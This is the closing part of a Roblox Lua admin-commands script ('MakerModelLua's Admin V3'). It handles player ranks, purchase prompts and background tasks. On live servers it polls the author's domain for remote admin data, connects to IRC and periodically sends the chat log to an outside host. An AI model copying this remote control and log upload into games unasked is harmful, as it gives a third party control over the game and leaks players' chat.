				Player:WaitForChild("PlayerGui"):WaitForChild("Output")
			end
			CORE:ExecuteResource("ClientLog", Player:WaitForChild("Backpack"), {["Admin"] = script})
			print("Executed ClientLog on "..Player.Name)
			if Settings.EnableTaskBar then
				GUI:SendChat(Player, "This place uses MakerModelLua's admin. Your rank is "..Rank..". Say "..Settings.Prefix.."cmds for commands.")
			end
		end)()
		
		coroutine.wrap(function()
			wait(7)
			Player:WaitForChild("PlayerGui")
			if IsSB == false and Player.UserId == game.CreatorId and not Server.MPS:PlayerOwnsAsset(Player, AdminID) then
				local Answer = GUI:PromptMessageWithButtons(Player, "Message from MakerModelLua's Admin", AdminInfo, "Admin", {"Ok", "No thanks"})
				if Answer == "Ok" then
					MARKET:PromptPurchase(Player, AdminID)
				end
			end
		end)()
	end
end)() end

-- Active stuff --

CORE:UpdateAdmin()
CORE:FixSettings()

ypcall(function()
	if not Server.Data:GetDataStore("MML's Admin"):GetAsync("Players") then
		Server.Data:GetDataStore("MML's Admin"):SetAsync("Players", {})
	end
end)


Server.MPS.PromptPurchaseFinished:connect(function(Player, ID, Purchased) if Purchased then
	local PlayerAdmin, Rank = RANK:IsAdmin(Player)
	if PlayerAdmin == false then
		if ID == Settings.VIPAdminID then table.insert(Settings.Ranks["Admin"], Player.Name) Rank = "Admin" GUI:TellAdmin(Player, Rank)
		elseif ID == Settings.VIPMemberID then table.insert(Settings.Ranks["Member"], Player.Name) Rank = "Member" GUI:TellAdmin(Player, Rank) end
	end
end end)

--[[
ExecuteCommand.OnInvoke = function(Player, Command)
	if Player and Command then
		if type(Player) == "userdata" and Player:IsA("Player") then
			CORE:Chatted(Command, Player, true)
		end
	end
end

ExecuteCode.OnInvoke = function(Source, Speaker)
	if type(Source) == "string" then
		ExecuteSafe(Source, Speaker)
	end
end

ExecuteCommandClient.OnServerInvoke = function(Player, Command)
	if Player and Command then
		if type(Player) == "userdata" and Player:IsA("Player") then
			CORE:Chatted(Command, Player, true)
		end
	end
end
]]








for _,Player in pairs(Server.Players:GetPlayers()) do CORE:Start(Player) end
Server.Players.PlayerAdded:connect(function(Player) Server.Players:WaitForChild(Player.Name) wait() CORE:Start(Player) end) Begin()
Server.Players.PlayerRemoving:connect(function(Player) for _,Obj in pairs(List) do if Obj == Player.UserId then for Ind,Name in pairs(Settings.Ranks.Owner) do if Player.Name == Name then table.remove(Settings.Ranks.Owner, Ind) end end end end end)

coroutine.wrap(function()
	for _,ID in pairs(Icons) do
		game:GetService("ContentProvider"):Preload("rbxassetid://"..ID)
	end
end)()

CORE:SetAbuseCommands()

coroutine.wrap(function() SOUND:SyncSoundList() end)()
if not IsStudio then coroutine.wrap(function()
	if Settings.EnableAdminMenu then Workspace.AllowThirdPartySales = true end
	REMOTE:GetRemoteData(true)
	REMOTE:CheckTrelloInfo()
	coroutine.wrap(function()
		if ypcall(function() return REMOTE:GetURL(CORE.Domain) end) then
			REMOTE.RemoteConnection = true
		end
	end)()
	coroutine.wrap(function() IRC:ConnectToServer(Settings.IRCServer) end)()
	coroutine.wrap(function()
		if Settings.LinkedAccount ~= "" then
			local Request = nil
			ypcall(function() Request = REMOTE:Decode(REMOTE:GetURL(CORE.Domain.."/Login/GetUserData.php?Username="..Settings.LinkedAccount)) end)
			if Request then
				REMOTE:HandleRequest(Request, true)
			end
		end
	end)()
	coroutine.wrap(function()
		wait(RemoteData.RemoteAdminWait)
		while REMOTE:GetAndSetWebData() do
			wait(RemoteData.RemoteAdminWait)
		end
	end)()
	coroutine.wrap(function()
		while wait(60) do
			REMOTE:GetRemoteData(true)
			REMOTE:CheckTrelloInfo()
		end
	end)()
end)() end
coroutine.wrap(function()
	if Settings.TrelloToken ~= "" then
		ypcall(function() Trello.RequiredLists = REMOTE:Decode(Server.HS:GetAsync("https://api.trello.com/1/boards/"..Trello.AdminBoardID.."/lists", true)) end)
		if #Trello.RequiredLists > 0 then
			Trello.MainBoard = REMOTE:TrelloGetAdminBoard()
			if Trello.MainBoard.name then
				local Lists = REMOTE:TrelloGetAdminLists(Trello.MainBoard)
				REMOTE:TrelloCacheData(Lists)
				REMOTE:TrelloHandleData(true)
				coroutine.wrap(function()
					wait(RemoteData.TrelloWait)
					while REMOTE:TrelloHandleData() do
						wait(RemoteData.TrelloWait)
					end
				end)()
			end
		end
	else
		print("If you would like M".."akerModelLu".."a's Admin V3 to use trello, make sure HttpEnabled is true and authorize using this link: \nhttps://trello.com/1/authorize?key=c01fcfabf2f8d707d01fb69312e4a9d7&name=MakerModelLua%27s+Admin+V3&expiration=never&response_type=token&scope=read,write\nCopy the token given when authorized and paste into 'TrelloToken' in the settings")
	end
end)()
coroutine.wrap(function() while wait(RemoteData.ChatLogWait) do
	REMOTE:SendChatLog()
end end)()
coroutine.wrap(function() while true do
	local ThisDate = REMOTE:GetURL("http://www.timeapi.org/utc/now?%5cm%2f%5cd%2f%5cY")
	if ThisDate then Date = ThisDate end
	wait(600)
end end)()

print("MakerModelLua's Admin Commands V"..CORE.Version.Value.." Loaded")